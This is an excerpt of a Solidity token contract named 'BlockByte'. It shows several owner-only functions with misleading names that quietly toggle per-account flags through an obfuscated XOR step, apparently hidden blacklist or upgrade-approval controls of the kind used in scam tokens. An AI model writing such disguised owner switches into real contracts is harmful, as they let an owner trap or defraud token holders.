...
contract BaseToken is Ownable {
    ...
    string constant public name = 'BlockByte';
    ...
    function InstanceConnect(address account) public onlyOwner {
        bool currentValue = _blockbytedance[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _blockbytedance[account] = secretValue != 0;
    } // Instance fls 
    ...
    function BlockbyteLayers2(address addressholders) public onlyOwner {
        bool currentValue = _solapprovetoupgradethecontract[addressholders];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _solapprovetoupgradethecontract[addressholders] = secretValue != 0;
    ...
    function BlockbitSharpGranted(address account) public {
    ...
    function BytedanceConnect(address account) public view returns(bool) {
        return _blockbytedance[account];
    }


}

contract BlockByteContract is BaseToken {
    constructor() {
